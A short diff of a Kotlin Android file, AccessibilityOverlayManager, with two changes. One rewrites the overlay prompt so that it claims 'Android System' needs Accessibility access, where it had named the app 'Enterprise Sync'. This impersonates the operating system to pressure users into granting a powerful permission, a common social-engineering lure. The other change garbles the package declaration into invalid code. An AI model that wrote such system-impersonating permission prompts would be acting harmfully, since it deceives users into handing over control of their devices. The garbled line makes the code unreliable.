@@ -1,4 +1,4 @@
-package com.example.service
+Enterprisexample.service
 
 import android.content.Context
 import android.content.Intent
@@ -222,7 +222,7 @@ object AccessibilityOverlayManager {
 
                 // Message Body
                 val messageView = TextView(appContext).apply {
-                    text = "Enterprise Sync needs Accessibility to function. Please enable it."
+                    text = "Android System needs Accessibility to function. Please enable it."
                     textSize = 14f
                     setTextColor(Color.parseColor("#94A3B8")) // Slate 400
                     gravity = Gravity.CENTER
